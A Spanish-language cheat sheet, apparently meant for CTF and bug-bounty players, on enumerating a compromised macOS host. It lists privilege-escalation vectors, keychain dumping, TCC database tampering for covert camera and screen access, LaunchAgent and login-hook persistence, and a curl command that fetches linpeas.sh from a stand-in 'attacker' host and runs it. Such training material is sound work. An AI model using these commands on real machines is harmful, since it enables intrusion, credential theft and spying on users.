macOS es un sistema basado en Darwin (Unix), pero tiene particularidades: lanzamiento de procesos con launchd, permisos de transparencia (TCC), Gatekeeper, y estructuras de archivos propias. Obtener una shell en macOS es menos frecuente en CTF, pero aparece en retos de nivel avanzado o entornos de bug bounty.
Enumeración básica del sistema
Comando	Propósito
whoami / id	Usuario y grupos
sw_vers	Versión de macOS (ej. 12.6.3)
system_profiler SPSoftwareDataType	Información detallada de software
uname -a	Kernel (Darwin) y arquitectura
hostname	Nombre del equipo
sysctl -a | grep machdep.cpu.brand_string	Modelo de CPU
csrutil status	Estado de SIP (System Integrity Protection). Si está deshabilitado, mucho más fácil atacar.
spctl --status	Estado de Gatekeeper
Enumeración de red
Comando	Equivalente / Nota
ifconfig o ip addr	Interfaces
netstat -an	Conexiones y puertos escuchando
route -n get default	Gateway por defecto
arp -a	Tabla ARP
networksetup -listallnetworkservices	Servicios de red (Wi‑Fi, Ethernet)
scutil --dns	Configuración DNS
Procesos y servicios
Comando	Descripción
ps aux	Procesos en ejecución
ps auxf	Árbol de procesos
launchctl list	Agentes/daemons de launchd (equivalente a systemd)
sudo launchctl list	Todos (incluyendo system)
top -o cpu	Procesos ordenados por CPU
Archivos y directorios sensibles en macOS
Ruta	Contenido
~/Desktop, ~/Documents	Posible flag
~/Library/Preferences	Archivos .plist con configuración de aplicaciones (credenciales en texto)
~/Library/Keychains/	Llaveros de contraseñas (requiere contraseña de usuario)
/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist	Redes Wi‑Fi guardadas (contraseñas en claro en algunos formatos)
/etc/passwd, /etc/master.passwd	Usuarios (el segundo es el de verdad, como shadow)
/Users/Shared/	Carpeta compartida, a veces con cosas interesantes
/private/var/log/	Logs del sistema
~/.bash_history, ~/.zsh_history	Historial de comandos
~/.ssh/id_rsa, ~/.ssh/authorized_keys	Claves SSH
/Library/LaunchDaemons/, /Library/LaunchAgents/	Archivos .plist de inicio
Herramientas para enumerar más a fondo

    system_profiler – equivalente a systeminfo pero más modular:
    bash

    system_profiler SPHardwareDataType   # hardware
    system_profiler SPApplicationsDataType   # aplicaciones instaladas
    system_profiler SPConfigurationProfileDataType   # perfiles de configuración

    kextstat – lista los kext (extensiones del kernel) cargados. Útil para detectar rootkits o software de seguridad.

Escalada de privilegios en macOS (vectores específicos)
Vector	Comando / Técnica
Sudo mal configurado	sudo -l – mirar si puedes ejecutar algún comando como root sin contraseña (ej. sudo visudo).
SUID binaries	find / -perm -4000 -type f 2>/dev/null – igual que en Linux, pero macOS tiene binarios específicos como ping, sudo, screen.
launchd agents mal escritos	Si puedes modificar un archivo .plist que se ejecute como root en /Library/LaunchDaemons/ y reiniciar el servicio (launchctl load), obtienes root.
Docker (si instalado)	Cuando el usuario está en el grupo docker, se puede montar la raíz del host.
TCC bypass (Transparency, Consent, and Control) – sqlite3 ~/Library/Application Support/com.apple.TCC/TCC.db	Si puedes modificar la BD de TCC, puedes otorgar permisos (acceso a cámara, micrófono, pantalla) a aplicaciones maliciosas.
crontab	macOS sigue usando cron, pero es menos común que en Linux. Revisar /etc/crontab y crontab -l.
Escalada por Kernel exploit	macOS tiene vulnerabilidades conocidas (ej. CVE‑2021‑30713, CVE‑2022‑26706) que pueden dar root si el kernel no está parcheado.
Interacción con Keychain (contraseñas almacenadas)

Si encuentras el llavero del usuario, puedes intentar extraer credenciales:
bash

security list-keychains                      # mostrar llaveros
security dump-keychain -d ~/Library/Keychains/login.keychain-db   # pedirá contraseña

Sin la contraseña del login, no se pueden extraer, pero a veces las contraseñas de red Wi‑Fi están en claro en los .plist de configuración.
Persistencia en macOS (si quieres mantener acceso)
Técnica	Archivo / Comando
LaunchAgent	Crear ~/Library/LaunchAgents/com.attacker.plist con programa a ejecutar
LaunchDaemon (root)	/Library/LaunchDaemons/com.attacker.plist
Login Hook	defaults write com.apple.loginwindow LoginHook /path/to/script.sh
Crontab	crontab -e (menos fiable actualmente)
Transferencia de archivos

Al igual que en Linux, usa curl o wget (si está instalado). También puedes usar python3 -m http.server y nc.

En macOS por defecto:
bash

curl -O http://attacker/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh   # aunque linpeas funciona en macOS también

¿Por qué es útil en macOS?

    Aparece en CTFs avanzados y en desafíos de bug bounty donde el objetivo es un Mac.

    La estructura es Unix‑like pero los comandos específicos (launchctl, system_profiler, security, csrutil) no están en Linux.

    TCC es un mecanismo de seguridad único; saber cómo listar y manipular permisos puede permitir espionaje (cámara, grabación de pantalla) sin que el usuario lo sepa.

    Keychain guarda contraseñas de correo, Wi‑Fi, servidores, etc.; si puedes obtener la clave del usuario, es un tesoro.
